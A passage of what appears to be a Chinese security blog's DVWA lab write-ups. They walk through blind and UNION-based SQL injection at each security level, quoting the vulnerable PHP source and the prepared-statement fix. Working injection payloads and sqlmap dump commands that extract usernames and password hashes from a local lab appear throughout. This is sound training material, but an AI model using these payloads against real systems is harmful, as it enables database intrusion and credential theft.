<h4 id="猜解字段名"><a href="#猜解字段名" class="headerlink" title="猜解字段名"></a>猜解字段名</h4><p>输入<code>1' and length(substr((select column_name from informtion_schema.columns where table_name='users' limit 0,1),1))=7；#</code>，输出<code>User ID exists in the database</code>，表明users表中第一个字段长度是7位，使用二分法可猜解出字段名；</p>
<h3 id="猜解字段"><a href="#猜解字段" class="headerlink" title="猜解字段"></a>猜解字段</h3><p>以猜解user字段为例</p>
<h4 id="猜解字段长度"><a href="#猜解字段长度" class="headerlink" title="猜解字段长度"></a>猜解字段长度</h4><p>输入<code>1' and length(substr((select user from users limit 0,1),1))=5;#</code>，输出<code>User ID exists in the database</code>，表明user的长度为5；</p>
<h4 id="猜解字段值"><a href="#猜解字段值" class="headerlink" title="猜解字段值"></a>猜解字段值</h4><p>输入<code>1' and ascii(substr((select user from users limit 0,1),1,1))&gt;97;#</code>，输出<code>User ID is MISSING from the database</code></p>
<p>输入<code>1' and ascii(substr((select user from users limit 0,1),1,1))&lt;97;#</code>，输出<code>User ID is MISSING from the database</code></p>
<p>表明第一个字段为a；</p>
<p>按照上述操作，利用二分法依次猜解；</p>
<p><strong>注意</strong>：以上猜解的方法，除了利用<strong>基于布尔的盲注方式</strong>，还可以利用<strong>基于时间延迟的盲注</strong>进行操作。此时，需要结合if函数和sleep()函数来测试不同判断条件导致的延迟效果差异，如：<code>1' and if(length(database())&gt;10,sleep(5),1) #</code>， if条件中即数据库的库、表、字段、字段值的获取和数值大小比较，若服务器响应时执行了sleep()函数，则判断if中的条件为真，否则为假。</p>
<h2 id="SQLmap注入"><a href="#SQLmap注入" class="headerlink" title="SQLmap注入"></a>SQLmap注入</h2><p>与上篇博客的注入方式一致，例如输入<code>sqlmap -u "http://localhost/dvwa/vulnerabilities/sqli_blind/?id=1&amp;Submit=Submit#" --cookie="security=low; PHPSESSID=4bq2qmdt2kkomp9qfvp3ko9rhd" -D dvwa -T users -C user,password --dump</code>直接爆破users表；</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20201116221207.png"></p>
<h1 id="MEDIUM"><a href="#MEDIUM" class="headerlink" title="MEDIUM"></a>MEDIUM</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#medium.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">'Submit'</span>])){</span><br><span class="line">        <span class="comment">// Get input</span></span><br><span class="line">        <span class="variable">$id</span> = <span class="variable">$_POST</span>[<span class="string">'id'</span>];</span><br><span class="line">        <span class="variable">$id</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">"___mysqli_ston"</span>]) &amp;&amp; <span class="title function_ invoke__">is_object</span>(<span class="variable">$GLOBALS</span>[<span class="string">"___mysqli_ston"</span>])) ? <span class="title function_ invoke__">mysqli_real_escape_string</span>(<span class="variable">$GLOBALS</span>[<span class="string">"___mysqli_ston"</span>], <span class="variable">$id</span>) : ((<span class="title function_ invoke__">trigger_error</span>(<span class="string">"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work."</span>, E_USER_ERROR)) ? <span class="string">""</span> : <span class="string">""</span>));</span><br><span class="line">        <span class="comment">// Check database</span></span><br><span class="line">        <span class="variable">$getid</span>  = <span class="string">"SELECT first_name, last_name FROM users WHERE user_id = <span class="subst">$id</span>;"</span>;</span><br><span class="line">        <span class="variable">$result</span> = <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$GLOBALS</span>[<span class="string">"___mysqli_ston"</span>], <span class="variable">$getid</span>); <span class="comment">// Removed 'or die' to suppress mysql errors</span></span><br><span class="line">        <span class="comment">// Get results</span></span><br><span class="line">        <span class="variable">$num</span> = @<span class="title function_ invoke__">mysqli_num_rows</span>(<span class="variable">$result</span>); <span class="comment">// The '@' character suppresses errors</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$num</span>&gt;<span class="number">0</span>){</span><br><span class="line">            <span class="comment">// Feedback for end user</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'&lt;pre&gt;User ID exists in the database.&lt;/pre&gt;'</span>;</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">else</span> {</span><br><span class="line">            <span class="comment">// Feedback for end user</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'&lt;pre&gt;User ID is MISSING from the database.&lt;/pre&gt;'</span>;</span><br><span class="line">        }</span><br><span class="line">        <span class="comment">//mysql_close();</span></span><br><span class="line">    }</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>

<p>分析：后端使用了post获取ID，且前端使用了下拉来限制输入；</p>
<p>此时只用burpsuite抓包更改即可，方式和LOW Security Level的方式相同；</p>
<p>SQLmap扫描只需将数据包包存后使用SQLmap指令直接扫描即可，例如<code>sqlmap -r data.txt -p id -D dvwa -T users -C user,password --dump</code>指令可以直接爆破数据表，其中data.txt存储请求数据信息；</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20201116221207.png"></p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20201116223220.png"></p>
<h1 id="HIGH"><a href="#HIGH" class="headerlink" title="HIGH"></a>HIGH</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#high.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_COOKIE</span>[<span class="string">'id'</span>])){</span><br><span class="line">        <span class="comment">// Get input</span></span><br><span class="line">        <span class="variable">$id</span> = <span class="variable">$_COOKIE</span>[<span class="string">'id'</span>];</span><br><span class="line">        <span class="comment">// Check database</span></span><br><span class="line">        <span class="variable">$getid</span>  = <span class="string">"SELECT first_name, last_name FROM users WHERE user_id = '<span class="subst">$id</span>' LIMIT 1;"</span>;</span><br><span class="line">        <span class="variable">$result</span> = <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$GLOBALS</span>[<span class="string">"___mysqli_ston"</span>], <span class="variable">$getid</span>); <span class="comment">// Removed 'or die' to suppress mysql errors</span></span><br><span class="line">        <span class="comment">// Get results</span></span><br><span class="line">        <span class="variable">$num</span> = @<span class="title function_ invoke__">mysqli_num_rows</span>(<span class="variable">$result</span>); <span class="comment">// The '@' character suppresses errors</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$num</span>&gt;<span class="number">0</span>){</span><br><span class="line">            <span class="comment">// Feedback for end user</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'&lt;pre&gt;User ID exists in the database.&lt;/pre&gt;'</span>;</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">else</span> {</span><br><span class="line">            <span class="comment">// Might sleep a random amount</span></span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">rand</span>(<span class="number">0</span>,<span class="number">5</span>)==<span class="number">3</span>){</span><br><span class="line">                <span class="title function_ invoke__">sleep</span>(<span class="title function_ invoke__">rand</span>(<span class="number">2</span>,<span class="number">4</span>));</span><br><span class="line">            }</span><br><span class="line">            <span class="comment">// User wasn't found, so the page wasn't!</span></span><br><span class="line">            <span class="title function_ invoke__">header</span>(<span class="variable">$_SERVER</span>[<span class="string">'SERVER_PROTOCOL'</span>].<span class="string">'404 Not Found'</span>);</span><br><span class="line">            <span class="comment">// Feedback for end user</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'&lt;pre&gt;User ID is MISSING from the database.&lt;/pre&gt;'</span>;</span><br><span class="line">        }</span><br><span class="line">        ((<span class="title function_ invoke__">is_null</span>(<span class="variable">$___mysqli_res</span> = <span class="title function_ invoke__">mysqli_close</span>(<span class="variable">$GLOBALS</span>[<span class="string">"___mysqli_ston"</span>]))) ? <span class="literal">false</span> : <span class="variable">$___mysqli_res</span>);</span><br><span class="line">    }</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>

<p>分析：使用了cookie获取ID，limit限制现实结果只有1个，rand函数扰乱基于时间的盲注；</p>
<p>手工注入只需要使用burpsuite抓包，更改cookie中的id参数值即可；</p>
<p>查询提交页面与查询结果显示页面不是同一个，也没有执行302跳转，这样做的目的是为了防止常规的SQLMap扫描注入测试，因为SQLMap在注入过程中，无法在查询提交页面上获取查询的结果，没有了反馈，也就没办法进一步注入；</p>
<p>但是并不代表High级别不能用SQLMap进行注入测试，此时需要利用其非常规的命令联合操作，如：<code>--second-url="xxxurl"</code>（设置二阶响应的结果显示页面的url）</p>
<p>由于采用了cookie获取ID，这里设置level为2，用于检测cookie中提交的信息；</p>
<p>说明：<strong>level为2级时，检测cookie；level为3级时，检测user-Agent/Referer；</strong></p>
<p>尝试使用<code>sqlmap -r data.txt --second-url "http://localhost/DVWA/vulnerabilities/sqli_blind/index.php" -p id --level 2</code>命令检测SQL注入漏洞，结果检测出SQL盲注漏洞，后续的注入按照SQLmap注入方式注入即可；</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20201116232325.png"></p>
<h1 id="IMPOSSIBLE"><a href="#IMPOSSIBLE" class="headerlink" title="IMPOSSIBLE"></a>IMPOSSIBLE</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#impossible.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">'Submit'</span>])){</span><br><span class="line">        <span class="comment">// Check Anti-CSRF token</span></span><br><span class="line">        <span class="title function_ invoke__">checkToken</span>(<span class="variable">$_REQUEST</span>[<span class="string">'user_token'</span>],<span class="variable">$_SESSION</span>[<span class="string">'session_token'</span>],<span class="string">'index.php'</span>);</span><br><span class="line">        <span class="comment">// Get input</span></span><br><span class="line">        <span class="variable">$id</span> = <span class="variable">$_GET</span>[<span class="string">'id'</span>];</span><br><span class="line">        <span class="comment">// Was a number entered?</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$id</span>)){</span><br><span class="line">            <span class="comment">// Check the database</span></span><br><span class="line">            <span class="variable">$data</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">prepare</span>(<span class="string">'SELECT first_name, last_name FROM users WHERE user_id = (:id) LIMIT 1;'</span>);</span><br><span class="line">            <span class="variable">$data</span>-&gt;<span class="title function_ invoke__">bindParam</span>(<span class="string">':id'</span>,<span class="variable">$id</span>,PDO::<span class="variable constant_">PARAM_INT</span>);</span><br><span class="line">            <span class="variable">$data</span>-&gt;<span class="title function_ invoke__">execute</span>();</span><br><span class="line">            <span class="comment">// Get results</span></span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$data</span>-&gt;<span class="title function_ invoke__">rowCount</span>()==<span class="number">1</span>){</span><br><span class="line">                <span class="comment">// Feedback for end user</span></span><br><span class="line">                <span class="keyword">echo</span> <span class="string">'&lt;pre&gt;User ID exists in the database.&lt;/pre&gt;'</span>;</span><br><span class="line">            }</span><br><span class="line">            <span class="keyword">else</span> {</span><br><span class="line">                <span class="comment">// User wasn't found, so the page wasn't!</span></span><br><span class="line">                <span class="title function_ invoke__">header</span>(<span class="variable">$_SERVER</span>[ <span class="string">'SERVER_PROTOCOL'</span>].<span class="string">'404 Not Found'</span>);</span><br><span class="line">                <span class="comment">// Feedback for end user</span></span><br><span class="line">                <span class="keyword">echo</span> <span class="string">'&lt;pre&gt;User ID is MISSING from the database.&lt;/pre&gt;'</span>;</span><br><span class="line">            }</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">    <span class="comment">// Generate Anti-CSRF token</span></span><br><span class="line">    <span class="title function_ invoke__">generateSessionToken</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>分析：采用了<code>PDO</code>技术，划清了代码与数据的界限，有效防御 SQL 注入，同时只有返回的查询结果数量为一时，才会成功输出，这样就有效预防了SQL注入攻击，<code>Anti-CSRFtoken</code> 机制的加入了进一步提高了安全性。</p>
]]></content>
      <categories>
        <category>DVWA</category>
      </categories>
      <tags>
        <tag>SQL Injection</tag>
        <tag>SQLmap</tag>
      </tags>
  </entry>
  <entry>
    <title>DVWA SQL Injection</title>
    <url>/DVWA-SQL-Injection.html</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>记录学习DVWA中的SQL注入过程，包括手工注入、SQLmap注入两部分。<span id="more"></span></p>
<p>目的：爆破数据库，通过SQL注入，找到dvwa网站所有的用户名及密码。</p>
<h1 id="LOW"><a href="#LOW" class="headerlink" title="LOW"></a>LOW</h1><h2 id="源代码"><a href="#源代码" class="headerlink" title="源代码"></a>源代码</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># low.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_REQUEST</span>[<span class="string">'Submit'</span>])){</span><br><span class="line">        <span class="comment">// Get input</span></span><br><span class="line">        <span class="variable">$id</span> = <span class="variable">$_REQUEST</span>[<span class="string">'id'</span>];</span><br><span class="line">        <span class="comment">// Check database</span></span><br><span class="line">        <span class="variable">$query</span> = <span class="string">"SELECT first_name, last_name FROM users WHERE user_id = '<span class="subst">$id</span>';"</span>;</span><br><span class="line">        <span class="variable">$result</span> = <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$GLOBALS</span>[<span class="string">"___mysqli_ston"</span>],<span class="variable">$query</span> ) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">'&lt;pre&gt;'</span>.((<span class="title function_ invoke__">is_object</span>(<span class="variable">$GLOBALS</span>[<span class="string">"___mysqli_ston"</span>]))? <span class="title function_ invoke__">mysqli_error</span>(<span class="variable">$GLOBALS</span>[<span class="string">"___mysqli_ston"</span>]):((<span class="variable">$___mysqli_res</span> = <span class="title function_ invoke__">mysqli_connect_error</span>())? <span class="variable">$___mysqli_res</span> : <span class="literal">false</span>)).<span class="string">'&lt;/pre&gt;'</span>);</span><br><span class="line">        <span class="comment">// Get results</span></span><br><span class="line">        <span class="keyword">while</span>(<span class="variable">$row</span> = <span class="title function_ invoke__">mysqli_fetch_assoc</span>(<span class="variable">$result</span>)){</span><br><span class="line">            <span class="comment">// Get values</span></span><br><span class="line">            <span class="variable">$first</span> = <span class="variable">$row</span>[<span class="string">"first_name"</span>];</span><br><span class="line">            <span class="variable">$last</span> = <span class="variable">$row</span>[<span class="string">"last_name"</span>];</span><br><span class="line">            <span class="comment">// Feedback for end user</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;ID: <span class="subst">{$id}</span>&lt;br /&gt;First name: <span class="subst">{$first}</span>&lt;br /&gt;Surname: <span class="subst">{$last}</span>&lt;/pre&gt;"</span>;</span><br><span class="line">        }</span><br><span class="line">        <span class="title function_ invoke__">mysqli_close</span>(<span class="variable">$GLOBALS</span>[<span class="string">"___mysqli_ston"</span>]);</span><br><span class="line">    }</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>分析：服务器端的low.php并没有对客户输入的id进行任何检查与过滤，直接将SQL语句的执行结果显示给客户端。</p>
<h2 id="手动注入"><a href="#手动注入" class="headerlink" title="手动注入"></a>手动注入</h2><h3 id="注入判断"><a href="#注入判断" class="headerlink" title="注入判断"></a>注入判断</h3><p>判断是否存在注入以及注入类型——字符型/数字型</p>
<ol>
<li><p>输入<code>1</code>，查询成功；</p>
<p> <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20201115171123.png"></p>
</li>
<li><p> 输入<code>1' and '1'='2</code>查询失败，无回显；</p>
</li>
<li><p>输入<code>1' and '1'='1</code>查询成功；</p>
<p> <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20201115171335.png"></p>
</li>
<li><p>输入<code>1'</code>报错；</p>
<p> <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20201115171423.png"></p>
</li>
</ol>
<p>根据上述发现猜测存在<strong>字符型注入</strong>。</p>
<h3 id="猜解SQL查询语句中的字段数"><a href="#猜解SQL查询语句中的字段数" class="headerlink" title="猜解SQL查询语句中的字段数"></a>猜解SQL查询语句中的字段数</h3><p>使用<code>order by</code>猜测SQL查询语句中的字段数，为union查询做准备</p>
<ol>
<li><p>输入<code>1' or 1=1 order by 1 #</code>，查询成功；</p>
<p> <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20201115172008.png"></p>
</li>
<li><p>输入<code>1' or 1=1 order by 2 #</code>，查询成功；</p>
<p> <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20201115172046.png"></p>
</li>
<li><p>输入<code>1' or 1=1 order by 3 #</code>，查询失败；</p>
<p> <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20201115172123.png"></p>
</li>
</ol>
<p>说明查询语句中存在2个字段，即First name和Surname；</p>
<h3 id="确定显示字段顺序"><a href="#确定显示字段顺序" class="headerlink" title="确定显示字段顺序"></a>确定显示字段顺序</h3><p>输入<code>1' union select 1,2 #</code>，查询成功，两个字段显示如下；</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20201115172625.png"></p>
<h3 id="获取当前数据库和用户名"><a href="#获取当前数据库和用户名" class="headerlink" title="获取当前数据库和用户名"></a>获取当前数据库和用户名</h3><p>输入<code>1' union select database(),user() #</code>，查看数据库为dvwa，用户为dvwa；</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20201115172816.png"></p>
<h3 id="获取数据库中的表"><a href="#获取数据库中的表" class="headerlink" title="获取数据库中的表"></a>获取数据库中的表</h3><p>输入<code>1' union select TABLE_NAME,2 from information_schema.TABLES where TABLE_SCHEMA='dvwa' #</code>，获取表名为guestbook和users</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20201115174208.png"></p>
<h3 id="获取表中的字段名"><a href="#获取表中的字段名" class="headerlink" title="获取表中的字段名"></a>获取表中的字段名</h3><p>输入<code>1' union select COLUMN_NAME,2 from information_schema.COLUMNS where TABLE_NAME='users' #</code>，获取字段如下user_id、first_name、last_name、user、password、avatar、last_login、failed_login、USER、CURRENT_CONNECTIONS、TOTAL_CONNECTIONS、id、username；</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20201115202820.png"></p>
<h3 id="下载数据"><a href="#下载数据" class="headerlink" title="下载数据"></a>下载数据</h3><p>输入<code>1' union select user,password from users #</code>，获取users表中的所有用户和密码；</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20201115203412.png"></p>
<p>查看表guestbook同理。</p>
<h2 id="SQLmap注入"><a href="#SQLmap注入" class="headerlink" title="SQLmap注入"></a>SQLmap注入</h2><h3 id="注入判断-1"><a href="#注入判断-1" class="headerlink" title="注入判断"></a>注入判断</h3><p>注意：dvwa需要登录才能访问漏洞测试页面，所以使用sqlmap时需要提交登录后的cookie，cookie中有关于dvwa的security level设置属性；</p>
<p>输入<code>sqlmap -u "http://localhost/dvwa/vulnerabilities/sqli/?id=&amp;Submit=Submit#" --cookie="security=low; PHPSESSID=qifnr3h532238h8989qf2vlcg5"</code>，发现存在SQL注入点id(GET),数据库类型为mysql；</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20201115204341.png"></p>
<h3 id="爆破数据库"><a href="#爆破数据库" class="headerlink" title="爆破数据库"></a>爆破数据库</h3><p>输入 <code>sqlmap -u "http://localhost/dvwa/vulnerabilities/sqli/?id=&amp;Submit=Submit#" --cookie="security=low; PHPSESSID=qifnr3h532238h8989qf2vlcg5" --dbs</code>，爆破数据库如下；</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20201115204558.png"></p>
<h3 id="爆破数据表"><a href="#爆破数据表" class="headerlink" title="爆破数据表"></a>爆破数据表</h3><p>选择dvwa数据库，输入<code>sqlmap -u "http://localhost/dvwa/vulnerabilities/sqli/?id=&amp;Submit=Submit#" --cookie="security=low; PHPSESSID=qifnr3h532238h8989qf2vlcg5" -D dvwa --tables</code>，爆破数据表如下；</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20201115204755.png"></p>
<h3 id="爆破字段"><a href="#爆破字段" class="headerlink" title="爆破字段"></a>爆破字段</h3><p>选择users表，输入<code>sqlmap -u "http://localhost/dvwa/vulnerabilities/sqli/?id=&amp;Submit=Submit#" --cookie="security=low; PHPSESSID=qifnr3h532238h8989qf2vlcg5" -D dvwa -T users --columns</code>，爆破字段如下；</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20201115204946.png"></p>
<h3 id="爆破字段内容"><a href="#爆破字段内容" class="headerlink" title="爆破字段内容"></a>爆破字段内容</h3><p>输入<code>sqlmap -u "http://localhost/dvwa/vulnerabilities/sqli/?id=&amp;Submit=Submit#" --cookie="security=low; PHPSESSID=qifnr3h532238h8989qf2vlcg5" -D dvwa -T users -C user,password --dump</code>，爆破user、password字段内容如下；</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20201115205247.png"></p>
<h1 id="MEDIUM"><a href="#MEDIUM" class="headerlink" title="MEDIUM"></a>MEDIUM</h1><h2 id="源代码-1"><a href="#源代码-1" class="headerlink" title="源代码"></a>源代码</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># medium.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">'Submit'</span>])){</span><br><span class="line">        <span class="comment">// Get input</span></span><br><span class="line">        <span class="variable">$id</span> = <span class="variable">$_POST</span>[<span class="string">'id'</span>];</span><br><span class="line">        <span class="variable">$id</span> = <span class="title function_ invoke__">mysqli_real_escape_string</span>(<span class="variable">$GLOBALS</span>[<span class="string">"___mysqli_ston"</span>],<span class="variable">$id</span>);</span><br><span class="line">        <span class="variable">$query</span>  = <span class="string">"SELECT first_name, last_name FROM users WHERE user_id = <span class="subst">$id</span>;"</span>;</span><br><span class="line">        <span class="variable">$result</span> = <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$GLOBALS</span>[<span class="string">"___mysqli_ston"</span>],<span class="variable">$query</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">'&lt;pre&gt;'</span>.<span class="title function_ invoke__">mysqli_error</span>(<span class="variable">$GLOBALS</span>[<span class="string">"___mysqli_ston"</span>]).<span class="string">'&lt;/pre&gt;'</span>);</span><br><span class="line">        <span class="comment">// Get results</span></span><br><span class="line">        <span class="keyword">while</span>( <span class="variable">$row</span> = <span class="title function_ invoke__">mysqli_fetch_assoc</span>(<span class="variable">$result</span>)){</span><br><span class="line">            <span class="comment">// Display values</span></span><br><span class="line">            <span class="variable">$first</span> = <span class="variable">$row</span>[<span class="string">"first_name"</span>];</span><br><span class="line">            <span class="variable">$last</span>  = <span class="variable">$row</span>[<span class="string">"last_name"</span>];</span><br><span class="line">            <span class="comment">// Feedback for end user</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;ID:<span class="subst">{$id}</span>&lt;br/&gt;First name:<span class="subst">{$first}</span>&lt;br/&gt;Surname: <span class="subst">{$last}</span>&lt;/pre&gt;"</span>;</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">    <span class="comment">// This is used later on in the index.php page</span></span><br><span class="line">    <span class="comment">// Setting it here so we can close the database connection in here like in the rest of the source scripts</span></span><br><span class="line">    <span class="variable">$query</span>  = <span class="string">"SELECT COUNT(*) FROM users;"</span>;</span><br><span class="line">    <span class="variable">$result</span> = <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$GLOBALS</span>[<span class="string">"___mysqli_ston"</span>],<span class="variable">$query</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">'&lt;pre&gt;'</span>.((<span class="title function_ invoke__">is_object</span>(<span class="variable">$GLOBALS</span>[<span class="string">"___mysqli_ston"</span>]))?<span class="title function_ invoke__">mysqli_error</span>(<span class="variable">$GLOBALS</span>[<span class="string">"___mysqli_ston"</span>]):((<span class="variable">$___mysqli_res</span>=<span class="title function_ invoke__">mysqli_connect_error</span>())?<span class="variable">$___mysqli_res</span>:<span class="literal">false</span>)).<span class="string">'&lt;/pre&gt;'</span>);</span><br><span class="line">    <span class="variable">$number_of_rows</span> = <span class="title function_ invoke__">mysqli_fetch_row</span>(<span class="variable">$result</span>)[<span class="number">0</span>];</span><br><span class="line">    <span class="title function_ invoke__">mysqli_close</span>(<span class="variable">$GLOBALS</span>[<span class="string">"___mysqli_ston"</span>]);</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>

<p>分析：改用POST方式提交，对id进行了mysqli_real_escape_string()函数过滤，但SQL语句存在数字型注入；</p>
<p>mysqli_real_escape_string()函数语法：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysqli_real_escape_string(connection,escapestring);</span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th align="left">参数</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left">connection</td>
<td align="left">必需，规定要使用的 MySQL 连接。</td>
</tr>
<tr>
<td align="left">escapestring</td>
<td align="left">必需，要转义的字符串。编码的字符是NULL(ASCII 0)、\n、\r、\、’、” 和 Control-Z。</td>
</tr>
</tbody></table>
<h2 id="手动注入-1"><a href="#手动注入-1" class="headerlink" title="手动注入"></a>手动注入</h2><h3 id="注入判断-2"><a href="#注入判断-2" class="headerlink" title="注入判断"></a>注入判断</h3><p>POST方式传递，采用抓包更改参数；</p>
<ol>
<li><p>抓包更改id为<code>1' and '1'='1</code>，报错，显示字符被转义，不是字符型注入；</p>
<p> <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20201115211926.png"></p>
</li>
<li><p> 抓包更改id为<code>1 and 1=2</code>，无回显；</p>
</li>
<li><p>抓包更改id为<code>1 and 1=1</code>，有回显如下；</p>
<p> <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20201115212532.png"></p>
</li>
<li><p>抓包更改id为<code>1 or 1=1</code>，有回显如下；</p>
<p> <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20201115212630.png"></p>
</li>
</ol>
<p>根据上述发现猜测存在<strong>数字型注入</strong>。</p>
<h3 id="猜解SQL查询语句中的字段数-1"><a href="#猜解SQL查询语句中的字段数-1" class="headerlink" title="猜解SQL查询语句中的字段数"></a>猜解SQL查询语句中的字段数</h3><p>使用<code>order by</code>猜测SQL查询语句中的字段数，为union查询做准备</p>
<ol>
<li><p>更改id为<code>1 or 1=1 order by 1 #</code>，查询成功；</p>
<p> <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20201115212909.png"></p>
</li>
<li><p>更改id为<code>1 or 1=1 order by 2 #</code>，查询成功；</p>
<p> <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20201115213015.png"></p>
</li>
<li><p>更改id为<code>1 or 1=1 order by 3 #</code>，查询失败；</p>
<p> <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20201115213055.png"></p>
</li>
</ol>
<p>说明查询语句中存在2个字段，即First name和Surname；</p>
<h3 id="确定显示字段顺序-1"><a href="#确定显示字段顺序-1" class="headerlink" title="确定显示字段顺序"></a>确定显示字段顺序</h3><p>更改id为<code>1 union select 1,2 #</code>，查询成功，两个字段显示如下；</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20201115213329.png"></p>
<h3 id="获取当前数据库和用户名-1"><a href="#获取当前数据库和用户名-1" class="headerlink" title="获取当前数据库和用户名"></a>获取当前数据库和用户名</h3><p>更改id为<code>1 union select database(),user() #</code>，查询成功，数据库为dvwa，用户为dvwa；</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20201115213543.png"></p>
<h3 id="获取数据库中的表-1"><a href="#获取数据库中的表-1" class="headerlink" title="获取数据库中的表"></a>获取数据库中的表</h3><p>更改id为<code>1 union select TABLE_NAME,2 form information_schema.TABLES where TABLE_SCHEMA=database() #</code>，查询成功，获取表如下；(此处的数据库名称也可为十六进制)</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20201115214838.png"></p>
<h3 id="获取表中的字段名-1"><a href="#获取表中的字段名-1" class="headerlink" title="获取表中的字段名"></a>获取表中的字段名</h3><p>更改id为<code>1 union select COLUMN_NAME,2 from information_schema.COLUMNS where TABLE_NAME=0x7573657273 #</code>，获取字段如下user_id、first_name、last_name、user、password、avatar、last_login、failed_login、USER、CURRENT_CONNECTIONS、TOTAL_CONNECTIONS、id、username；</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20201115215648.png"></p>
<h3 id="下载数据-1"><a href="#下载数据-1" class="headerlink" title="下载数据"></a>下载数据</h3><p>更改id为<code>1 union select user,password from users #</code>，获取users表中的所有用户和密码；</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20201115215916.png"></p>
<h2 id="SQLmap注入-1"><a href="#SQLmap注入-1" class="headerlink" title="SQLmap注入"></a>SQLmap注入</h2><p>SQLmap进行POST注入过程如下：</p>
